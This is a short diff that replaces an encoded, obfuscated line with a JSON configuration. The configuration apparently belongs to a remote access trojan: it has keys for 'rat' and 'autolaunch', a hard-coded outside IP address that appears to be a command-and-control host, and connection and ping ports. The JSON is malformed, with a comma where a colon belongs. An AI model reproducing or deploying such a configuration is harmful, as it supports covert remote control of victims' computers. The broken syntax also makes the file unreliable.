@@ -1,1 +1,10 @@
-cmpiV1ZhTXlwYUFjbzI0dkJ2TmtZd05mUHR4dn$zRXVxVUltVndidFZ4NWlvekh2WU5iV1ZhV3Vx\nUFY2VlBX*m8yNXlWdmpYUEZXd*pxS0Vpb1RTMW96*WJWdmp0Vng1aW96SHZZTmJXVnp5alZ3YnRW\nd1ZoWkd0Mll3UjJBRj*x*lBWZlB0eHZwVDlscVBWNlZRTDBBd0RmClB0eHZwVHloTTE5am8zVzBW\nd2J0*W14M0JGalh*Rld2cUpNek1LVnZCdk4xWkdWalpOYzkK\n
+{
+	"version": 1.0,
+	"status": "None",
+	"rat": "None",
+	"autolaunch", "None",
+	"ip": "2.186.165.58",
+	"port": 6464,
+	"ping_port": 7979,
+	"buffer": 51200
+}
